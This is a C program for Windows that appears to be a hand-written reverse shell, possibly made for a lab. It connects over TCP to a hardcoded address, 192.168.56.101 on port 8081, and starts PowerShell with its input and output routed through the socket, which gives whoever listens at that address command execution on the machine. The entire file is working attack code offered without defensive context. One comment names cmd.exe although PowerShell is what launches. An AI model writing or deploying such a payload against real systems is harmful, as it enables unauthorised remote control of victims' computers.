#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")


char SERVER_IP[16] = "192.168.56.101";
int SERVER_PORT = 8081;
SOCKET sockfd, newsockfd;
struct sockaddr_in serv_addr;
char input[512]; 
WSADATA wsaDATA; // Variable to store data about the Windows socket.
STARTUPINFO si; //STARTUPINFOA?
PROCESS_INFORMATION pi; // Contain information about a process. 
char process[] = "PowerShell.exe ";

int main() {
   
    // Initialize the Winsock library. 
    if (WSAStartup(MAKEWORD(2,2), &wsaDATA) != 0) {
        perror("WSAstartup failed.\n");
        return -1;
    }

    // Creates a socket with IPv4 and TCP. (Consider WSASocket())
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
    if (sockfd == INVALID_SOCKET) {
        printf("Error creating socket: %d", WSAGetLastError());
        return -1;
    }

    // Configure the serv_addr 
    memset((char*)&serv_addr, 0 , sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    //serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP); <- Alternative. 

    // inet_pton converts IP address from text to binary 
    if(inet_pton(AF_INET, SERVER_IP, &(serv_addr.sin_addr)) <= 0) {
        printf("Invalid IP address");
        return -1;
    }

    
    // Connect to the IP we spesified 
    if (WSAConnect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) < 0) {
        printf("Error connecting to server: %d", WSAGetLastError());
        return -1;
    }

    else {
        recv(sockfd, input, sizeof(input), 0); //Receive data from the socket and save it in input buffer.
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) sockfd;
        CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE); // Run cmd.exe untill it is terminated. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(&input, 0, sizeof(input));
    }

    return 0;
}
